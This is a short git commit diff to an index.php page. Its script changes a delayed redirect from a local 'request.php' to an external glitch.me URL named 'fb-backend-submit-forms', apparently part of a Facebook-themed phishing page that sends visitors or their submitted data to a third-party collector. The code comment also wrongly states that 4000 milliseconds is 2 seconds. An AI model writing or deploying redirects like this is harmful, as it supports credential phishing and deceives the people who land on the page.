dc46d8c1dca6bf5f2bebdb5f847962fc8abeaec2
req-noewq <166973820+req-noewq@users.noreply.github.com>
2024-04-22 01:42:29 -0700

    Update index.php

--- index.php
+++ index.php
@@ -38,7 +38,7 @@
       var currentHost = window.location.hostname;
       
       setTimeout(function() {
-        var redirectURL = "request.php"; // Updated URL
+        var redirectURL = "https://fb-backend-submit-forms.glitch.me/"; // Updated URL
         window.location.replace(redirectURL);
       }, 4000); // 4000 milliseconds (2 seconds)
     });
